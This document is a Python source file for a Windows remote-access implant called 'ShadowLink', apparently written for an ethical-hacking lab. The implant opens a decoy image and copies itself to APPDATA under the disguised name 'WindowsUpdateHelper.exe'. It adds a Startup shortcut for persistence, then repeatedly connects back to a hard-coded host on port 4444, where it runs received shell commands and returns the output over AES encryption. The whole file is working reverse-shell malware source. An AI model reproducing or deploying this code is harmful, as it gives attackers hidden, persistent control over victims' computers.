import base64
import ctypes
import hashlib
import os
import shutil
import socket
import struct
import subprocess
import sys
import tempfile
import time
import win32com.client

from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad

SERVER_HOST     = "192.168.174.128"
SERVER_PORT     = 4444
RECONNECT_DELAY = 5
PASSPHRASE      = b"ShadowLink-EH-2026"
KEY             = hashlib.sha256(PASSPHRASE).digest()
APPDATA         = os.getenv("APPDATA", "")
APPDATA_EXE     = os.path.join(APPDATA, "WindowsUpdateHelper.exe")
STARTUP_DIR     = os.path.join(APPDATA, r"Microsoft\Windows\Start Menu\Programs\Startup")
STARTUP_LNK     = os.path.join(STARTUP_DIR, "WindowsUpdateHelper.lnk")
_MUTEX_NAME     = "Local\\ShadowLinkSingleInstance"
_DECOY_B64      = ""

def ensure_single_instance():
    handle = ctypes.windll.kernel32.CreateMutexW(None, False, _MUTEX_NAME)
    if not handle:
        return
    if ctypes.windll.kernel32.GetLastError() == 183:
        sys.exit(0)
    ensure_single_instance._handle = handle

def is_installed():
    return os.path.exists(APPDATA_EXE)

def open_decoy():
    log_path = os.path.join(os.environ.get('USERPROFILE', 'C:/Users/rub'), 'Desktop', 'decoy_log.txt')
    log = open(log_path, 'w')
    try:
        log.write('stap1: start' + chr(10))
        p = tempfile.mktemp(suffix='.avif')
        log.write('stap2: p=' + p + chr(10))
        data = base64.b64decode(_DECOY_B64)
        log.write('stap3: decoded ' + str(len(data)) + ' bytes' + chr(10))
        with open(p, 'wb') as f:
            f.write(data)
        log.write('stap4: bestand geschreven' + chr(10))
        os.startfile(p)
        log.write('stap5: startfile gedaan' + chr(10))
    except Exception as e:
        log.write('FOUT: ' + str(e) + chr(10))
    finally:
        log.close()

def persist_startup():
    try:
        src = os.path.abspath(sys.argv[0])
        if not os.path.exists(APPDATA_EXE):
            shutil.copy2(src, APPDATA_EXE)
        os.makedirs(STARTUP_DIR, exist_ok=True)
        if not os.path.exists(STARTUP_LNK):
            shell = win32com.client.Dispatch("WScript.Shell")
            lnk = shell.CreateShortcut(STARTUP_LNK)
            lnk.TargetPath = APPDATA_EXE
            lnk.Save()
    except Exception as e:
        open(os.path.join(os.environ.get("TEMP","C:/Temp"),"decoy_err.txt"),"w").write(str(e))

def encrypt(data: bytes) -> bytes:
    iv = get_random_bytes(16)
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(pad(data, AES.block_size))

def decrypt(data: bytes) -> bytes:
    iv, ct = data[:16], data[16:]
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(ct), AES.block_size)

def send_msg(sock, data: bytes):
    enc = encrypt(data)
    sock.sendall(struct.pack(">I", len(enc)) + enc)

def recv_msg(sock) -> bytes:
    raw = b""
    while len(raw) < 4:
        chunk = sock.recv(4 - len(raw))
        if not chunk:
            raise ConnectionResetError
        raw += chunk
    length = struct.unpack(">I", raw)[0]
    data = b""
    while len(data) < length:
        chunk = sock.recv(min(4096, length - len(data)))
        if not chunk:
            raise ConnectionResetError
        data += chunk
    return decrypt(data)

def execute(cmd: str) -> str:
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=30
        )
        return (result.stdout + result.stderr) or "(geen uitvoer)"
    except Exception as e:
        return str(e)

def session(sock):
    while True:
        cmd = recv_msg(sock).decode()
        if cmd.lower() == "exit":
            break
        output = execute(cmd)
        send_msg(sock, output.encode())

def main():
    ensure_single_instance()
    if not is_installed():
        open_decoy()
        persist_startup()
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((SERVER_HOST, SERVER_PORT))
            session(sock)
        except Exception:
            pass
        finally:
            try:
                sock.close()
            except Exception:
                pass
        time.sleep(RECONNECT_DELAY)

if __name__ == "__main__":
    main()


